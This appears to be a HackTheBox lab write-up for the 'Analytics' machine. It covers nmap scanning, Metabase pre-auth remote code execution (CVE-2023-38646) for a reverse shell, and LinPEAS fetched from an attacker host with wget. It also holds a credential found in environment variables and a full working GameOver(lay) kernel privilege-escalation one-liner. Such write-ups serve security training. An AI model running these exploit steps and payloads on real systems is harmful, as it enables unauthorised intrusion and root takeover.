---
title: Analytics - HTB Writeup
date: 2024-03-22 10:03
categories: [ctf, linux, easy]
tags: [htb, linux, ctf, easy]    # TAG names should be lowercase
---


# Machine Overview

**Analytics** was an easy-rated Linux machine, involving the exploitation of **CVE-2023-38646** for initial access and **CVE-2023-32629** for Privilege Escalation.

<img  alt="Pasted image 20240322120647" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/adce0329-b6e1-49bc-acd6-68eb1d6e2275">

# User
## Scanning with nmap
  
First of all, we will go with Nmap to scan the whole network and check for services running on the network. To scan the entire network and find all the open ports, I use **-p-** to scan all **65535** ports with **--min-rate 10000** to scan the network faster using **nmap**. After scanning, I retrieve a list of open ports on the network and extract only the open ports using various terminal tools like **cut**, **tr**, etc.

```bash
$ nmap -p- -Pn --min-rate 10000 10.10.11.233 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
# Open ports
22,80
```

Now Let's run the depth scan on these specific ports using 

```bash
$ nmap -p22,80 -sC -sV -A -T4 -Pn 10.10.11.233 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file
- **-Pn** to Treat all hosts as online

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Information Gathering

Through Nmap, we discovered only two ports are open. On Port **22**, SSH version **8.9p1** is running on an Ubuntu system, and on port **80**, HTTP **Nginx 1.18.0** is running. Both versions of SSH and Nginx are not vulnerable, so I decided to directly visit the webpage. Let's add `analytical.htb` in our DNS file.

```bash
$ echo "10.10.11.233   analytical.htb" | sudo tee -a /etc/hosts
```

### 80 HTTP

The webpage is running the Data Analysis website, which deals in Data processing and helping customers to find recent trends and products, with different pages linked on the **navbar**.

<img  alt="Pasted image 20240321191106" src="https://github.com/iammR0OT/myaseen/assets/74102381/960bbbd9-408c-466d-a138-fccbb00742aa">

The Login button on navbar is retdirecting us to subdomain called `data.analytical.htb`. 

<img  alt="Pasted image 20240321191211" src="https://github.com/iammR0OT/myaseen/assets/74102381/38cb8468-eece-4e17-a3e9-e93bc94ee304">

Let's Add this to our local DNS file, so that we can resolve it.

```bash
$ cat /etc/hosts | grep analytical
10.10.11.233   analytical.htb data.analytical.htb
```

#### Initial Access

On `data.analytical.htb`, Metabase is running.
Metabase is **an open source business intelligence tool that lets you create charts and dashboards using data from a variety of databases and data sources**. You don't need to know SQL to create visualizations, but Metabase supports SQL for advanced customization.

<img  alt="Pasted image 20240321191714" src="https://github.com/iammR0OT/myaseen/assets/74102381/9175639c-936b-43f5-adef-4cf495ac45bf">

With a Quick google Search i was able to find a RCE exploit of metabase [CVE-2023-38646](https://github.com/m3m0o/metabase-pre-auth-rce-poc)

<img  alt="Pasted image 20240321191841" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/07497b78-0735-4057-b5a6-e922a9c0ca36">

To make this Exploit work, we needs the **target URL**, the **setup token** and a **command** that will be executed. The setup token can be obtained through the `/api/session/properties` endpoint. Copy the value of the `setup-token` key. 

<img  alt="Pasted image 20240321192204" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/916047a0-2bd7-49ad-8567-d1572a4a2eac">

Now we have all necessary things for exploit to work. Let's Exploit it...
- URL: `http://data.analytical.htb/`
- Setup-Token: `249fa03d-fd94-4d5b-b94f-b4ebf3df681f`
- Command: rev-shell

<img  alt="Pasted image 20240322105945" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/76f340f4-d143-49a2-ab81-62d1da352916">

We got a shell within no time. Let's run Linpease to check if we able to find any useful things to elevate our privileges.
**LinPEAS** is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.
i'll be using python server to transfer linpease from my attacker machine to victime machine, for this you first need to start a python server on your local machine in a directory where linpeas is present.

```bash
$ python3 -m http.server 80
```

After that, use **wget** to transfer it to victim machine and using chmod, give it executable permissions.

```bash
$ wget <IP>/linpeas.sh
$ chmod +x linpeas.sh
```

<img  alt="Pasted image 20240322113146" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/4ef40d6e-2830-4cc7-bf34-dc2f66d2605d">

After running Linpeas, in Environments section, we were able to retrieve the password of a new user called **metalytics** 
- metalytics
- An4lytics_ds20223#

<img  alt="Pasted image 20240322114718" src="https://github.com/iammR0OT/myaseen/assets/74102381/357decf1-6a38-4d4d-a489-2e4e75c08e8e">

Let's SSH to machine using these Credentials and retrieve our user flag.

```bash
$ sshpass -p 'An4lytics_ds20223#' ssh metalytics@10.10.11.233
```

<img  alt="Pasted image 20240322114914" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/3278a655-71af-497f-b4db-7b9d1f918147">

# Privilege Escalation

Let's move toward privilege Escalation part. The very first thing i usually do is to check the kernel version running on machine, because if the version is outdated, then it will be low hanging fruit for us to gain root access on machine.
To check the kernel version, we can use multiple commands like

```bash
$ uname -a
$ cat /proc/version
$ lscpu
```

Linux **Kernel 6.2.0** is running on machine

<img  alt="Pasted image 20240322115359" src="https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/14ed00e2-57f1-4247-924c-9a9c0613d82d">

With a quick google search i was able to find kernel exploit for privilege Escalation, [CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) called **GameOver(lay)** Ubuntu Privilege Escalation
Local privilege escalation vulnerability in Ubuntu Kernels overlayfs **ovl_copy_up_meta_inode_data** skip permission checks when calling ovl_do_setxattr on Ubuntu kernels.


<img  alt="Pasted image 20240322115605" src="https://github.com/iammR0OT/myaseen/assets/74102381/4bd8a86f-6ca2-446b-8230-ee9eb244bfaa">

The payload will be.

```bash
$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

<img  alt="Pasted image 20240322120025" src="https://github.com/iammR0OT/myaseen/assets/74102381/bd0465d5-fb48-46c6-9dd9-ffd2be2be58b">


# Flags

User: edd9e7f9b0b992....7958419d05ccb 

Root: b9b4c98f4512a4....c0fad7fd933a6b

# Happy Hacking ❤
